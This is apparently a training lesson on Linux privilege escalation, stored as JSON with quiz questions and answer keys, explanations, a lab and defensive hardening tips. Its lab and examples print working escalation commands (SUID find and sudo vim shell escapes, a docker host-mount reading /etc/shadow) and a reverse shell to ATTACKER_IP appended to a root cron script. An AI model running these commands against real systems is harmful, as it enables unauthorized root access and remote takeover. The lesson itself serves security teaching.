@@ -1,0 +1,152 @@
+{
+  "lesson_id": "7cc86924-31cf-4735-a70c-12ff028f5a82",
+  "lesson_number": "712",
+  "domain": "linux",
+  "title": "Linux Privilege Escalation Techniques",
+  "difficulty": 3,
+  "order_index": 27,
+  "prerequisites": [
+    "Linux File System Security"
+  ],
+  "concepts": [
+    "SUID binaries",
+    "Kernel exploits",
+    "Sudo misconfigurations",
+    "PATH hijacking",
+    "Cron job abuse"
+  ],
+  "estimated_time": 55,
+  "learning_objectives": [
+    "Identify SUID/SGID binaries that can be abused for privilege escalation",
+    "Find and exploit sudo misconfigurations using GTFOBins",
+    "Abuse writable cron jobs for privilege escalation",
+    "Understand kernel exploit paths and when to use them",
+    "Use tools like LinPEAS and Linux Smart Enumeration (LSE)"
+  ],
+  "post_assessment": [
+    {
+      "question": "Which command finds SUID binaries on a Linux system?",
+      "options": [
+        "find / -perm -u=s -type f 2>/dev/null",
+        "ls -la /bin",
+        "grep SUID /etc/passwd",
+        "chmod u+s /bin/bash"
+      ],
+      "correct_answer": 0,
+      "explanation": "The find command with -perm -u=s searches for files with the SUID bit set.",
+      "type": "multiple_choice",
+      "difficulty": 2,
+      "question_id": "f2e88007-549f-49c8-a06e-d34d2fbc78e7"
+    },
+    {
+      "question": "What does GTFOBins provide for penetration testers?",
+      "options": [
+        "A list of firewall bypass rules",
+        "Curated Unix binaries that can bypass local security restrictions",
+        "A database of CVEs for Linux kernels",
+        "Automated exploit scripts for SUID binaries"
+      ],
+      "correct_answer": 1,
+      "explanation": "GTFOBins (https://gtfobins.github.io) catalogs Unix binaries that can be used to bypass local security restrictions.",
+      "type": "multiple_choice",
+      "difficulty": 2,
+      "question_id": "35c12533-b0d8-4efa-8099-6ca543acfad3"
+    },
+    {
+      "question": "A user can run '/usr/bin/vim' as root via sudo without a password. How can this be exploited?",
+      "options": [
+        "vim has no shell escape features",
+        "Run :!bash inside vim to get a root shell",
+        "Edit /etc/passwd directly isn't possible through vim",
+        "This is not a vulnerability"
+      ],
+      "correct_answer": 1,
+      "explanation": "Many editors including vim allow shell command execution. Running :!bash from within vim (executed as root via sudo) drops you into a root shell.",
+      "type": "multiple_choice",
+      "difficulty": 3,
+      "question_id": "c738a555-657f-414a-b28c-354eae0f3065"
+    },
+    {
+      "question": "What is the risk of a world-writable cron job script running as root?",
+      "options": [
+        "The script runs slower",
+        "Any user can modify the script to execute arbitrary commands as root",
+        "Cron jobs cannot execute privileged commands",
+        "The cron job will fail to run"
+      ],
+      "correct_answer": 1,
+      "explanation": "If a cron job script is world-writable and runs as root, any user can inject malicious commands that will execute with root privileges.",
+      "type": "multiple_choice",
+      "difficulty": 2,
+      "question_id": "107b2b10-25af-48f1-8245-5c1ad987ef20"
+    },
+    {
+      "question": "Why should kernel exploits be used as a last resort in CTF/pentesting?",
+      "options": [
+        "They are always detected by antivirus",
+        "They can crash the system and are noisy",
+        "Kernel exploits require physical access",
+        "They only work on specific hardware"
+      ],
+      "correct_answer": 1,
+      "explanation": "Kernel exploits can destabilize or crash the system, making them risky. They are also noisier and should be reserved when other paths are exhausted.",
+      "type": "multiple_choice",
+      "difficulty": 2,
+      "question_id": "490c3d39-ae98-42e7-b9ad-db11e83d1357"
+    }
+  ],
+  "jim_kwik_principles": [
+    "teach_like_im_10",
+    "active_learning",
+    "memory_hooks",
+    "connect_to_what_i_know",
+    "minimum_effective_dose",
+    "multiple_memory_pathways",
+    "learning_sprint",
+    "reframe_limiting_beliefs",
+    "gamify_it",
+    "meta_learning"
+  ],
+  "content_blocks": [
+    {
+      "type": "mindset_coach",
+      "content": "Privilege escalation is the art of climbing the permissions ladder using the mistakes others left behind. On Linux, these mistakes are everywhere — a sticky bit here, a misconfigured sudo entry there. This lesson turns you into the detective who notices them all."
+    },
+    {
+      "type": "explanation",
+      "content": "## Linux Privilege Escalation Overview\n\nPrivilege escalation (privesc) means going from a low-privileged shell to root. On Linux, the primary paths are:\n\n1. **SUID/SGID binaries** — Files with the SUID bit run as their owner (often root), regardless of who executes them\n2. **Sudo misconfigurations** — Overly permissive `/etc/sudoers` entries\n3. **Writable cron jobs** — Scripts executed by root that any user can modify\n4. **PATH hijacking** — When a SUID program calls another binary without a full path\n5. **Kernel exploits** — Vulnerabilities in the kernel itself (last resort)\n\n```bash\n# Automated enumeration with LinPEAS\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# Manual SUID search\nfind / -perm -u=s -type f 2>/dev/null\n\n# Check sudo permissions\nsudo -l\n```"
+    },
+    {
+      "type": "explanation",
+      "content": "## Teach Me Like I'm 10\n\nImagine a school where some lockers have a master key attached to them. If you can get to one of those lockers, you automatically have the master key too!\n\nSUID binaries are like those lockers. Normally you can only open your own locker. But if you find a locker with a master key attached (SUID bit), and you know the trick to 'borrow' that key while opening it, suddenly you have root access — the master key of the whole system.\n\nSudo misconfigurations are like a teacher writing on the board: 'Student X can use my desk whenever they want.' If you are Student X, and the teacher's desk has the answer key — you've got everything you need."
+    },
+    {
+      "type": "code_exercise",
+      "content": "## Hands-On: SUID Exploitation Lab\n\n**Scenario:** You have a low-privileged shell on a Linux machine.\n\n```bash\n# Step 1: Find SUID binaries\nfind / -perm -u=s -type f 2>/dev/null | grep -v proc\n\n# Step 2: Check /usr/bin/find (a classic SUID misconfiguration)\n# If find has SUID bit:\n/usr/bin/find . -exec /bin/bash -p \\; -quit\n# The -p flag preserves the effective UID (root)\n\n# Step 3: Enumerate sudo rights\nsudo -l\n# Output example:\n# (ALL) NOPASSWD: /usr/bin/vim\n\n# Step 4: Exploit vim sudo entry\nsudo vim -c ':!/bin/bash'\n\n# Step 5: Check for writable cron scripts\nls -la /etc/cron* /var/spool/cron/\ncat /etc/crontab\n\n# Step 6: If /opt/backup.sh is world-writable and runs as root:\necho 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh\n```\n\n**Practice resources:** TryHackMe 'Linux PrivEsc' room, HackTheBox easy Linux machines"
+    },
+    {
+      "type": "real_world",
+      "content": "## Real-World Case: Docker Group Privilege Escalation\n\nA developer was added to the `docker` group for convenience. This seemingly harmless action is equivalent to giving root access:\n\n```bash\n# User in docker group\nid\n# uid=1001(developer) gid=1001(developer) groups=1001(developer),999(docker)\n\n# Mount the host filesystem into a container\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh\n# Now you're root with access to the entire host filesystem!\n\n# Read /etc/shadow, add a backdoor user, anything goes\ncat /mnt/etc/shadow\n```\n\n**Lesson:** Membership in the `docker`, `lxd`, or `disk` groups is functionally equivalent to root. Audit group memberships carefully."
+    },
+    {
+      "type": "memory_aid",
+      "content": "## Memory Hook: SUDO SUID CRON PATH KERNEL\n\nRemember the escalation checklist as **S-S-C-P-K**:\n- **S**UDO — check `sudo -l` first, easiest wins\n- **S**UID — `find / -perm -u=s` for binary abuse\n- **C**RON — writable scripts running as root\n- **P**ATH — hijackable commands in SUID binaries\n- **K**ERNEL — last resort, check `uname -r` vs ExploitDB\n\nLinPEAS automates all of these. Run it first, understand why later."
+    },
+    {
+      "type": "reflection",
+      "content": "## Defensive Reflection\n\nNow flip the perspective — you're a sysadmin. What hardening steps prevent the attacks you just learned?\n\n1. **Audit SUID bits:** `find / -perm -u=s -type f` — remove unnecessary ones with `chmod u-s <file>`\n2. **Tight sudoers:** Use specific commands only, never `NOPASSWD: ALL`\n3. **Secure cron:** Ensure cron scripts are owned by root with mode 700\n4. **Principle of least privilege:** Never add users to docker/disk/lxd groups casually\n5. **Kernel updates:** Patch regularly — unpatched kernels are easy exploits\n\nDefense is just privilege escalation prevention at scale."
+    },
+    {
+      "type": "mindset_coach",
+      "content": "You've now seen how small misconfigurations cascade into full system compromise. This is why security is everyone's responsibility — not just the admins. Every 'quick hack' to make something work (chmod 777, NOPASSWD sudo) is a door you left open. Now you know what walks through those doors."
+    }
+  ],
+  "tags": [
+    "linux",
+    "privilege escalation",
+    "SUID",
+    "sudo",
+    "pentest",
+    "red team"
+  ]
+}
